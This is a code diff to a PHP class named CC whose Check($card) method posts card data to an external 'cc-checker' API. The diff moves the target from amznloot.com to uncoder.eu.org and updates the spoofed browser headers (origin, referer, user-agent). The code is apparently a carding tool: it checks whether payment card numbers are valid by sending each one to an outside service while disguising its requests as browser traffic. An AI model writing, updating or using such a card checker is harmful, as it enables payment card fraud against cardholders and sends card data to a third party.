@@ -111,17 +111,17 @@ class CC
     protected function Check($card)
     {
         $headers = array();
-        $headers[] = 'origin: https://amznloot.com';
+        $headers[] = 'origin: https://uncoder.eu.org';
         $headers[] = 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-        $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36';
+        $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
         $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
         $headers[] = 'Accept: */*';
-        $headers[] = 'referer: https://amznloot.com/cc-checker/';
+        $headers[] = 'referer: https://uncoder.eu.org/cc-checker/';
         $headers[] = 'X-Requested-With: XMLHttpRequest';
         $headers[] = 'Connection: keep-alive';
         $ch = curl_init();
         $options = array(
-            CURLOPT_URL             => "https://amznloot.com/cc-checker/api.php",
+            CURLOPT_URL             => "https://uncoder.eu.org/cc-checker/api.php",
             CURLOPT_RETURNTRANSFER  => true,
             CURLOPT_POST            => true,
             CURLOPT_POSTFIELDS      => "data=" . urlencode($card),
